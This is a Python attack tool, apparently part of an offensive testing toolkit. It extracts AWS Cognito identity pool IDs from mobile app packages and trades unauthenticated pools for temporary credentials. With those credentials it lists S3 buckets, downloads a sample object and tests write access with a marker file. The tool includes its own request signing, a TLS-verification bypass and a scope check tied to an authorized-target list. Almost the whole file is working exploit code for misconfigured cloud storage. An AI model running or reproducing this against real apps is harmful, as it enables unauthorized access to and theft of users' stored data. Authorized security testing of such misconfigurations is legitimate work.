#!/usr/bin/env python3
"""Cognito 未认证身份池 → STS → S3（授权范围内）。

对齐：传承/客池·仓格.md
默认：抽池 ID / 换钥 / 列桶列对象 + 明文分类。write-probe 只写自建 marker。
get-sample 只抽 1 个小明文对象做 L3。

示例:
  python3 炼蛊房/cognito_s3_probe.py extract --path ./app.apk --case <案卷>
  python3 炼蛊房/cognito_s3_probe.py chain --app-host 授权域 --case <案卷> --pool-id 'ap-southeast-1:…'
  python3 炼蛊房/cognito_s3_probe.py get-sample --app-host 授权域 --case <案卷> --creds-file … --bucket <桶>
"""
from __future__ import annotations

import argparse
import hashlib
import hmac
import io
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from xml.etree import ElementTree as ET

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-cognito_s3_probe"
# 含中国区 / Gov；冒号前必须是 AWS region
POOL_RE = re.compile(
    r"\b((?:us|us-gov|ap|eu|sa|ca|me|af|cn|il)-[a-z]+-\d:"
    r"[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})\b"
)
MARKER_PREFIX = ".daaixianzun-writeprobe-"
PLAIN_EXT = {
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".svg",
    ".mp4", ".mp3", ".wav", ".pdf", ".txt", ".json", ".html", ".css",
}
ENC_HINTS = (".xlog", ".tea", ".enc", "voice", "video", "backup", "encrypt", "msg-backup", "logsfile")
ZIP_SUFFIX = {".apk", ".ipa", ".zip", ".aar"}
SCAN_SUFFIX = {
    ".json", ".js", ".plist", ".xml", ".html", ".txt", ".properties",
    ".so", ".dex", ".dylib", ".cfg", ".conf",
}
SAMPLE_MAX = 200_000



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args: Any, **kwargs: Any) -> None:  # noqa: ARG002
        return None


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "cognito_s3"
    d.mkdir(parents=True, exist_ok=True)
    return d


def save(case: str, name: str, obj: Any) -> Path:
    p = case_dir(case) / name
    p.write_text(json.dumps(obj, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return p


def ensure_app_scope(app_host: str) -> str:
    h = host_of(app_host) or app_host.strip().lower()
    if not h:
        raise SystemExit("[scope] 需要 --app-host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return h
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")
    return h


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def aws_dns_suffix(region: str) -> str:
    return "amazonaws.com.cn" if region.startswith("cn-") else "amazonaws.com"


def uri_encode(value: str, *, encode_slash: bool) -> str:
    safe = "-_.~" if encode_slash else "-_.~/"
    return urllib.parse.quote(str(value), safe=safe)


def canonical_query(query: str | dict[str, Any] | None) -> str:
    if not query:
        return ""
    if isinstance(query, dict):
        items = [(str(k), "" if v is None else str(v)) for k, v in query.items()]
    else:
        items = urllib.parse.parse_qsl(query, keep_blank_values=True)
    encoded = sorted((uri_encode(k, encode_slash=True), uri_encode(v, encode_slash=True)) for k, v in items)
    return "&".join(f"{k}={v}" for k, v in encoded)


def s3_object_path(key: str) -> str:
    if not key or key == "/":
        return "/"
    return "/" + uri_encode(key.lstrip("/"), encode_slash=False)


def classify_key(key: str) -> str:
    low = key.lower()
    if any(h in low for h in ENC_HINTS):
        return "encrypted_hint"
    suf = Path(key).suffix.lower()
    if suf in PLAIN_EXT:
        return "plaintext"
    return "unknown"


def magic_label(data: bytes) -> str:
    if data.startswith(b"\xff\xd8\xff"):
        return "jpeg"
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "png"
    if data.startswith(b"GIF8"):
        return "gif"
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "webp"
    if data.startswith(b"%PDF"):
        return "pdf"
    if data.startswith(b"{") or data.startswith(b"["):
        return "jsonish"
    return "other"


def http(
    url: str,
    *,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    insecure: bool = False,
    timeout: float = 20,
    follow_redirects: bool = True,
) -> dict[str, Any]:
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    handlers: list[urllib.request.BaseHandler] = [
        urllib.request.HTTPSHandler(context=ssl_ctx(insecure)),
        urllib.request.HTTPHandler(),
    ]
    if not follow_redirects:
        handlers.insert(0, _NoRedirect())
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(2_000_000)
            return {
                "ok": True,
                "status": resp.status,
                "headers": {k.lower(): v for k, v in resp.headers.items()},
                "body": body,
                "url": url,
            }
    except urllib.error.HTTPError as e:
        body = e.read(2_000_000) if e.fp else b""
        return {
            "ok": False,
            "status": e.code,
            "headers": {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
            "body": body,
            "url": url,
            "error": str(e),
        }
    except Exception as e:
        return {"ok": False, "status": 0, "headers": {}, "body": b"", "url": url, "error": str(e)}


def decode_body(raw: bytes) -> str:
    return (raw or b"").decode("utf-8", errors="replace")


def cognito_host(region: str) -> str:
    return f"cognito-identity.{region}.{aws_dns_suffix(region)}"


def cognito_call(region: str, target: str, payload: dict[str, Any], insecure: bool) -> dict[str, Any]:
    url = f"https://{cognito_host(region)}/"
    data = json.dumps(payload, separators=(",", ":")).encode()
    r = http(
        url,
        method="POST",
        data=data,
        insecure=insecure,
        headers={
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": target,
        },
    )
    text = decode_body(r.get("body") or b"")
    parsed: Any = None
    try:
        parsed = json.loads(text) if text else None
    except Exception:
        parsed = None
    r["text"] = text
    r["json"] = parsed
    return r


def sign_v4(
    method: str,
    host: str,
    path: str,
    query: str,
    region: str,
    service: str,
    creds: dict[str, str],
    payload: bytes = b"",
    extra_headers: dict[str, str] | None = None,
) -> dict[str, str]:
    now = datetime.now(UTC)
    amz_date = now.strftime("%Y%m%dT%H%M%SZ")
    datestamp = now.strftime("%Y%m%d")
    payload_hash = hashlib.sha256(payload).hexdigest()
    headers = {
        "host": host,
        "x-amz-date": amz_date,
        "x-amz-content-sha256": payload_hash,
        "x-amz-security-token": creds["session"],
    }
    if extra_headers:
        headers.update({k.lower(): v for k, v in extra_headers.items()})
    signed_hdrs = ";".join(sorted(headers))
    canonical_headers = "".join(f"{k}:{headers[k]}\n" for k in sorted(headers))
    q = canonical_query(query)
    canonical = (
        f"{method}\n{path}\n{q}\n{canonical_headers}\n{signed_hdrs}\n{payload_hash}"
    )
    scope = f"{datestamp}/{region}/{service}/aws4_request"
    string_to_sign = (
        f"AWS4-HMAC-SHA256\n{amz_date}\n{scope}\n{hashlib.sha256(canonical.encode()).hexdigest()}"
    )

    def _hmac(key: bytes, msg: str) -> bytes:
        return hmac.new(key, msg.encode(), hashlib.sha256).digest()

    k_date = _hmac(("AWS4" + creds["secret"]).encode(), datestamp)
    k_region = hmac.new(k_date, region.encode(), hashlib.sha256).digest()
    k_service = hmac.new(k_region, service.encode(), hashlib.sha256).digest()
    k_signing = hmac.new(k_service, b"aws4_request", hashlib.sha256).digest()
    sig = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()
    headers["authorization"] = (
        f"AWS4-HMAC-SHA256 Credential={creds['ak']}/{scope}, "
        f"SignedHeaders={signed_hdrs}, Signature={sig}"
    )
    return headers


def parse_bucket_region(headers: dict[str, str], body: str) -> str | None:
    loc = (headers or {}).get("x-amz-bucket-region")
    if loc:
        return loc.strip()
    m = re.search(r"<Region>([^<]+)</Region>", body or "")
    if m:
        return m.group(1).strip()
    m = re.search(r"<Endpoint>([^<]+)</Endpoint>", body or "")
    if m:
        em = re.search(r"s3[.-]([a-z0-9-]+)\.amazonaws", m.group(1))
        if em and em.group(1) not in ("amazonaws", "dualstack"):
            return em.group(1)
    return None


def s3_host_for(bucket: str | None, region: str) -> tuple[str, str]:
    """返回 (host, 签名用 region)。全球 ListBuckets 必须签 us-east-1。"""
    suffix = aws_dns_suffix(region)
    if not bucket:
        if region.startswith("cn-"):
            return f"s3.{region}.{suffix}", region
        return "s3.amazonaws.com", "us-east-1"
    return f"{bucket}.s3.{region}.{suffix}", region


def s3_request(
    creds: dict[str, str],
    region: str,
    bucket: str | None,
    path: str = "/",
    query: str | dict[str, Any] = "",
    method: str = "GET",
    payload: bytes = b"",
    insecure: bool = False,
    content_type: str | None = None,
    _retried: bool = False,
) -> dict[str, Any]:
    q = canonical_query(query)
    host, sign_region = s3_host_for(bucket, region)
    extra = {}
    if content_type:
        extra["content-type"] = content_type
    hdrs = sign_v4(method, host, path, q, sign_region, "s3", creds, payload, extra)
    if content_type:
        hdrs["content-type"] = content_type
    url = f"https://{host}{path}"
    if q:
        url += "?" + q
    r = http(url, method=method, data=payload or None, headers=hdrs, insecure=insecure, follow_redirects=False)
    r["resolved_region"] = region
    r["signed_region"] = sign_region
    if _retried or not bucket:
        return r
    loc = parse_bucket_region(r.get("headers") or {}, decode_body(r.get("body") or b""))
    if loc and loc != region and r.get("status") in (301, 307, 400):
        r2 = s3_request(
            creds, loc, bucket, path, query, method, payload, insecure, content_type, _retried=True,
        )
        r2["redirected_from"] = region
        return r2
    return r


def xml_text(root: ET.Element, tag: str) -> list[str]:
    ns = ""
    if root.tag.startswith("{"):
        ns = root.tag.split("}")[0] + "}"
    return [el.text or "" for el in root.iter(f"{ns}{tag}") if el.text]


def xml_pairs(root: ET.Element, child_tag: str, fields: tuple[str, ...]) -> list[dict[str, str]]:
    ns = ""
    if root.tag.startswith("{"):
        ns = root.tag.split("}")[0] + "}"
    out: list[dict[str, str]] = []
    for el in root.iter(f"{ns}{child_tag}"):
        row: dict[str, str] = {}
        for f in fields:
            node = el.find(f"{ns}{f}")
            if node is not None and node.text:
                row[f.lower()] = node.text
        if row:
            out.append(row)
    return out


def get_creds(pool_id: str, insecure: bool) -> dict[str, Any]:
    if ":" not in pool_id:
        raise SystemExit("pool-id 必须是 region:uuid")
    region = pool_id.split(":", 1)[0]
    r1 = cognito_call(region, "AWSCognitoIdentityService.GetId", {"IdentityPoolId": pool_id}, insecure)
    j1 = r1.get("json") or {}
    ident = j1.get("IdentityId")
    out = {"region": region, "get_id": {"status": r1.get("status"), "body": j1 or r1.get("text")}}
    if not ident:
        out["ok"] = False
        return out
    r2 = cognito_call(
        region,
        "AWSCognitoIdentityService.GetCredentialsForIdentity",
        {"IdentityId": ident},
        insecure,
    )
    j2 = r2.get("json") or {}
    c = j2.get("Credentials") or {}
    out.update({
        "ok": bool(c.get("AccessKeyId") and c.get("SecretKey")),
        "identity_id": ident,
        "get_creds_status": r2.get("status"),
        "expiration": c.get("Expiration"),
        "creds": {
            "ak": c.get("AccessKeyId") or "",
            "secret": c.get("SecretKey") or "",
            "session": c.get("SessionToken") or "",
        },
    })
    return out


def load_or_get_creds(args: argparse.Namespace) -> tuple[dict[str, str], str, dict[str, Any]]:
    """优先 --creds-file，否则 GetId。返回 (creds, region, meta)。"""
    creds_path = getattr(args, "creds_file", "") or ""
    if creds_path:
        p = Path(creds_path)
        if not p.is_file():
            p = case_dir(args.case) / creds_path
        if not p.is_file():
            raise SystemExit(f"找不到 creds: {creds_path}")
        data = json.loads(p.read_text(encoding="utf-8"))
        creds = {
            "ak": data.get("ak") or data.get("AccessKeyId") or "",
            "secret": data.get("secret") or data.get("SecretKey") or "",
            "session": data.get("session") or data.get("SessionToken") or "",
        }
        if not (creds["ak"] and creds["secret"] and creds["session"]):
            raise SystemExit("creds 缺 ak/secret/session")
        region = data.get("region") or (getattr(args, "pool_id", "") or "").split(":")[0]
        if not region:
            raise SystemExit("creds 无 region，请加 --s3-region 或完整 pool-id")
        return creds, region, {"source": str(p), "identity_id": data.get("identity_id")}
    pool_id = getattr(args, "pool_id", "") or ""
    if not pool_id:
        raise SystemExit("需要 --pool-id 或 --creds-file")
    got = get_creds(pool_id, getattr(args, "insecure", False))
    if not got.get("ok"):
        raise SystemExit("换钥失败，先跑 chain")
    return got["creds"], got["region"], got


def sts_endpoint(cognito_region: str) -> tuple[str, str]:
    """全球 STS 端点必须用 us-east-1 签名；中国区走区域端点。"""
    if cognito_region.startswith("cn-"):
        return f"sts.{cognito_region}.{aws_dns_suffix(cognito_region)}", cognito_region
    return "sts.amazonaws.com", "us-east-1"


def caller_identity(creds: dict[str, str], cognito_region: str, insecure: bool) -> dict[str, Any]:
    q = b"Action=GetCallerIdentity&Version=2011-06-15"
    host, sign_region = sts_endpoint(cognito_region)
    hdrs = sign_v4(
        "POST", host, "/", "", sign_region, "sts", creds, q,
        {"content-type": "application/x-www-form-urlencoded"},
    )
    hdrs["content-type"] = "application/x-www-form-urlencoded"
    r = http(f"https://{host}/", method="POST", data=q, headers=hdrs, insecure=insecure, follow_redirects=False)
    text = decode_body(r.get("body") or b"")
    r["text"] = text
    r["signed_region"] = sign_region
    try:
        root = ET.fromstring(text)
        r["json"] = {
            "Account": (xml_text(root, "Account") or [""])[0],
            "Arn": (xml_text(root, "Arn") or [""])[0],
            "UserId": (xml_text(root, "UserId") or [""])[0],
        }
    except Exception:
        r["json"] = None
    return r


def iter_file_blobs(path: Path) -> list[tuple[str, bytes]]:
    out: list[tuple[str, bytes]] = []
    suf = path.suffix.lower()
    if suf in ZIP_SUFFIX and zipfile.is_zipfile(path):
        try:
            with zipfile.ZipFile(path) as zf:
                for name in zf.namelist()[:4000]:
                    if name.endswith("/"):
                        continue
                    low = name.lower()
                    interesting = (
                        Path(low).suffix in SCAN_SUFFIX
                        or "aws" in low
                        or "cognito" in low
                        or "amplify" in low
                    )
                    if not interesting:
                        continue
                    info = zf.getinfo(name)
                    if info.file_size > 20_000_000:
                        continue
                    try:
                        out.append((f"{path}!{name}", zf.read(name)))
                    except Exception:
                        continue
        except Exception:
            pass
        return out
    try:
        if path.stat().st_size < 40_000_000:
            out.append((str(path), path.read_bytes()))
    except Exception:
        pass
    return out


def extract_pools(root: Path) -> list[dict[str, str]]:
    files: list[Path] = [root] if root.is_file() else [
        p for p in root.rglob("*") if p.is_file() and p.stat().st_size < 40_000_000
    ]
    hits: list[dict[str, str]] = []
    for p in files[:4000]:
        for label, data in iter_file_blobs(p):
            text = data.decode("utf-8", errors="ignore")
            for m in POOL_RE.findall(text):
                hits.append({"pool_id": m, "file": label})
            if b"IdentityPool" in data or b"cognito-identity" in data or b"awsconfiguration" in data:
                for m in POOL_RE.findall(data.decode("latin-1", errors="ignore")):
                    hits.append({"pool_id": m, "file": label})
    uniq: list[dict[str, str]] = []
    seen: set[str] = set()
    for h in hits:
        if h["pool_id"] not in seen:
            seen.add(h["pool_id"])
            uniq.append(h)
    return uniq


def list_objects(
    creds: dict[str, str],
    region: str,
    bucket: str,
    insecure: bool,
    max_keys: int = 50,
) -> dict[str, Any]:
    q = {"list-type": "2", "max-keys": str(max_keys)}
    r = s3_request(creds, region, bucket, "/", q, "GET", b"", insecure)
    body = decode_body(r.get("body") or b"")
    items: list[dict[str, Any]] = []
    if r.get("status") == 200 and "Key" in body:
        try:
            root = ET.fromstring(body)
            for row in xml_pairs(root, "Contents", ("Key", "Size", "LastModified")):
                key = row.get("key") or ""
                items.append({
                    "key": key,
                    "size": int(row["size"]) if row.get("size", "").isdigit() else row.get("size"),
                    "last_modified": row.get("lastmodified"),
                    "class": classify_key(key),
                })
        except Exception:
            items = []
    counts: dict[str, int] = {}
    for it in items:
        counts[it["class"]] = counts.get(it["class"], 0) + 1
    return {
        "status": r.get("status"),
        "region": r.get("resolved_region"),
        "redirected_from": r.get("redirected_from"),
        "keys": items,
        "class_counts": counts,
        "error": None if r.get("status") == 200 else (body[:300] or r.get("error")),
    }


def cmd_extract(args: argparse.Namespace) -> int:
    root = Path(args.path)
    if not root.exists():
        raise SystemExit(f"找不到 {root}")
    uniq = extract_pools(root)
    out = {"ts": _now(), "path": str(root), "count": len(uniq), "pools": uniq}
    p = save(args.case, "extract.json", out)
    print(f"[+] {p} pools={len(uniq)}")
    for h in uniq:
        print(f"  {h['pool_id']}  ← {h['file']}")
    if uniq:
        print("  next: chain --pool-id '<id>' --app-host <授权域>")
    return 0


def cmd_chain(args: argparse.Namespace) -> int:
    ensure_app_scope(args.app_host)
    hint_region = args.s3_region or ""
    if args.creds_file:
        creds, region, meta = load_or_get_creds(args)
        ident_id = meta.get("identity_id")
        save(args.case, "auth.json", {
            "ts": _now(),
            "app_host": args.app_host,
            "pool_id": args.pool_id or "",
            "ok": True,
            "identity_id": ident_id,
            "note": f"复用 {meta.get('source')}，勿提交 git",
        })
    else:
        got = get_creds(args.pool_id, args.insecure)
        region = got.get("region") or args.pool_id.split(":")[0]
        save(args.case, "auth.json", {
            "ts": _now(),
            "app_host": args.app_host,
            "pool_id": args.pool_id,
            "ok": got.get("ok"),
            "identity_id": got.get("identity_id"),
            "get_id": got.get("get_id"),
            "expiration": got.get("expiration"),
            "note": "完整 STS 在 creds.json，勿提交 git",
        })
        if not got.get("ok"):
            print("[!] 换钥失败")
            print(json.dumps(got.get("get_id"), ensure_ascii=False)[:400])
            return 2
        creds = got["creds"]
        ident_id = got.get("identity_id")
        save(args.case, "creds.json", {
            "ts": _now(), "region": region, **creds, "identity_id": ident_id,
        })
    if hint_region:
        region = hint_region

    ident = caller_identity(creds, region, args.insecure)
    ident_j = ident.get("json") or {}
    print(f"[+] STS ok identity={ident_id}")
    print(f"    caller Account={ident_j.get('Account')} Arn={ident_j.get('Arn')}")
    print(f"    sts signed_region={ident.get('signed_region')}")

    buckets: list[str] = []
    listed = s3_request(creds, region, None, "/", "", "GET", b"", args.insecure)
    text = decode_body(listed.get("body") or b"")
    if listed.get("status") == 200 and "<?xml" in text[:80]:
        root = ET.fromstring(text)
        buckets = xml_text(root, "Name")
        print(f"[+] ListBuckets {len(buckets)}")
        for b in buckets[:30]:
            print(f"    - {b}")
    else:
        print(f"[!] ListBuckets status={listed.get('status')} snippet={text[:200]!r}")

    objects: dict[str, Any] = {}
    targets = [args.bucket] if args.bucket else buckets
    for bkt in targets[: args.max_buckets]:
        info = list_objects(creds, region, bkt, args.insecure, args.max_keys)
        objects[bkt] = info
        loc = info.get("region")
        extra = f" region={loc}" if loc else ""
        if info.get("redirected_from"):
            extra += f" (was {info['redirected_from']})"
        print(f"    list {bkt} status={info['status']} keys={len(info['keys'])} {info.get('class_counts')}{extra}")

    out = {
        "ts": _now(),
        "app_host": args.app_host,
        "pool_id": args.pool_id or "",
        "identity_id": ident_id,
        "caller": ident_j,
        "buckets": buckets,
        "objects_sample": objects,
        "next": [
            "他人读：List 已证则填 object_matrix",
            "L3：get-sample --bucket <桶>（只抽 1 个小明文）",
            "写格：write-probe --creds-file 案卷/cognito_s3/creds.json --bucket <桶>",
            "禁止默认覆盖用户 Key / 全量下载",
        ],
    }
    p = save(args.case, "chain.json", out)
    print(f"[+] {p}")
    return 0


def cmd_get_sample(args: argparse.Namespace) -> int:
    ensure_app_scope(args.app_host)
    creds, region, _meta = load_or_get_creds(args)
    if args.s3_region:
        region = args.s3_region
    key = args.key
    size = None
    if not key:
        info = list_objects(creds, region, args.bucket, args.insecure, max_keys=80)
        region = info.get("region") or region
        pick = None
        for it in info.get("keys") or []:
            if it.get("class") != "plaintext":
                continue
            sz = it.get("size")
            if isinstance(sz, int) and sz > SAMPLE_MAX:
                continue
            pick = it
            break
        if not pick:
            raise SystemExit("没有合适的小明文对象；可 --key 指定（仍受 2MB 截断）")
        key = pick["key"]
        size = pick.get("size")
    if size and isinstance(size, int) and size > SAMPLE_MAX and not args.key:
        raise SystemExit(f"对象太大 ({size})，默认不拉")
    r = s3_request(creds, region, args.bucket, s3_object_path(key), "", "GET", b"", args.insecure)
    body = r.get("body") or b""
    out_dir = case_dir(args.case)
    safe_name = re.sub(r"[^A-Za-z0-9._-]+", "_", key)[-80:]
    sample_path = out_dir / f"sample_{safe_name}"
    if r.get("status") == 200 and body:
        sample_path.write_bytes(body[:SAMPLE_MAX])
    meta = {
        "ts": _now(),
        "bucket": args.bucket,
        "key": key,
        "status": r.get("status"),
        "region": r.get("resolved_region"),
        "bytes": len(body),
        "magic": magic_label(body),
        "class": classify_key(key),
        "saved": str(sample_path) if r.get("status") == 200 else "",
        "note": "L3 只抽 1 个；不是全量用户数据",
    }
    p = save(args.case, "sample_meta.json", meta)
    print(f"[+] get-sample status={meta['status']} magic={meta['magic']} class={meta['class']} → {p}")
    return 0 if r.get("status") == 200 else 2


def cmd_write_probe(args: argparse.Namespace) -> int:
    ensure_app_scope(args.app_host)
    creds, region, _meta = load_or_get_creds(args)
    if args.s3_region:
        region = args.s3_region
    key = MARKER_PREFIX + datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ") + ".txt"
    payload = b"daaixianzun write-probe marker; delete me\n"
    path = s3_object_path(key)
    put = s3_request(creds, region, args.bucket, path, "", "PUT", payload, args.insecure, "text/plain")
    if put.get("redirected_from") or put.get("resolved_region"):
        region = put.get("resolved_region") or region
    get = s3_request(creds, region, args.bucket, path, "", "GET", b"", args.insecure)
    delete = s3_request(creds, region, args.bucket, path, "", "DELETE", b"", args.insecure)
    out = {
        "ts": _now(),
        "bucket": args.bucket,
        "key": key,
        "region": region,
        "put": put.get("status"),
        "get": get.get("status"),
        "delete": delete.get("status"),
        "get_ok": (get.get("body") or b"").startswith(b"daaixianzun"),
        "note": "只证明写；未覆盖用户对象",
    }
    p = save(args.case, "write_probe.json", out)
    print(f"[+] write-probe put={out['put']} get={out['get']} delete={out['delete']} → {p}")
    return 0 if out["put"] in (200, 201) else 2


def cmd_selftest(_args: argparse.Namespace) -> int:
    pid = "ap-southeast-1:12345678-1234-1234-1234-123456789012"
    cn = "cn-north-1:12345678-1234-1234-1234-123456789012"
    cnw = "cn-northwest-1:abcdef01-2345-6789-abcd-ef0123456789"
    assert POOL_RE.search(pid), "sea pool"
    assert POOL_RE.search(cn), "cn-north"
    assert POOL_RE.search(cnw), "cn-northwest"
    assert canonical_query("max-keys=50&list-type=2") == "list-type=2&max-keys=50"
    assert canonical_query({"max-keys": 50, "list-type": 2}) == "list-type=2&max-keys=50"
    assert s3_object_path("a b") == "/a%20b"
    assert s3_object_path("dir/file.jpg") == "/dir/file.jpg"
    assert classify_key("avatar/1.jpg") == "plaintext"
    assert classify_key("chat/a.xlog") == "encrypted_hint"
    assert classify_key("msg-backup/1.zip") == "encrypted_hint"
    assert sts_endpoint("ap-southeast-1") == ("sts.amazonaws.com", "us-east-1")
    assert sts_endpoint("cn-north-1")[1] == "cn-north-1"
    assert s3_host_for(None, "ap-southeast-1") == ("s3.amazonaws.com", "us-east-1")
    host, _ = s3_host_for("demo", "ap-northeast-1")
    assert host == "demo.s3.ap-northeast-1.amazonaws.com"
    assert parse_bucket_region({"x-amz-bucket-region": "ap-northeast-1"}, "") == "ap-northeast-1"
    assert magic_label(b"\x89PNG\r\n\x1a\nxxxx") == "png"

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("assets/awsconfiguration.json", json.dumps({"IdentityPoolId": pid}))
    raw = buf.getvalue()
    tmp = Path("/tmp/se_cognito_selftest.apk")
    tmp.write_bytes(raw)
    try:
        found = extract_pools(tmp)
    finally:
        tmp.unlink(missing_ok=True)
    assert any(h["pool_id"] == pid for h in found), found
    print("[selftest] ok")
    return 0


def _add_auth_args(p: argparse.ArgumentParser, *, pool_required: bool) -> None:
    p.add_argument("--app-host", required=True, help="泄露该池的授权 App/站域名")
    p.add_argument("--case", required=True)
    p.add_argument("--pool-id", required=pool_required, default="")
    p.add_argument("--creds-file", default="", help="复用 chain 落下的 creds.json，避免再 GetId")
    p.add_argument("--s3-region", default="", help="桶 region 与池不同时指定；缺省跟 301 头走")
    p.add_argument("--insecure", action="store_true")


def main() -> int:
    ap = argparse.ArgumentParser(description="Cognito 未认证池打 S3（授权范围内）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("extract", help="从 APK/IPA/目录抽 IdentityPoolId（会解压 zip）")
    p.add_argument("--path", required=True)
    p.add_argument("--case", required=True)
    p.set_defaults(func=cmd_extract)

    p = sub.add_parser("chain", help="换钥 + 列桶/对象 + 明文分类")
    _add_auth_args(p, pool_required=False)
    p.add_argument("--bucket", default="")
    p.add_argument("--max-buckets", type=int, default=8)
    p.add_argument("--max-keys", type=int, default=50)
    p.set_defaults(func=cmd_chain)

    p = sub.add_parser("get-sample", help="L3：抽 1 个小明文对象")
    _add_auth_args(p, pool_required=False)
    p.add_argument("--bucket", required=True)
    p.add_argument("--key", default="", help="指定 Key；默认挑第一个小明文")
    p.set_defaults(func=cmd_get_sample)

    p = sub.add_parser("write-probe", help="自建 marker 证明写后删除")
    _add_auth_args(p, pool_required=False)
    p.add_argument("--bucket", required=True)
    p.set_defaults(func=cmd_write_probe)

    p = sub.add_parser("selftest", help="本地单测（不打 AWS）")
    p.set_defaults(func=cmd_selftest)

    args = ap.parse_args()
    if args.cmd in {"chain", "get-sample", "write-probe"}:
        if not args.pool_id and not args.creds_file:
            raise SystemExit(f"{args.cmd} 需要 --pool-id 或 --creds-file")
    return int(args.func(args) or 0)


if __name__ == "__main__":
    sys.exit(main())
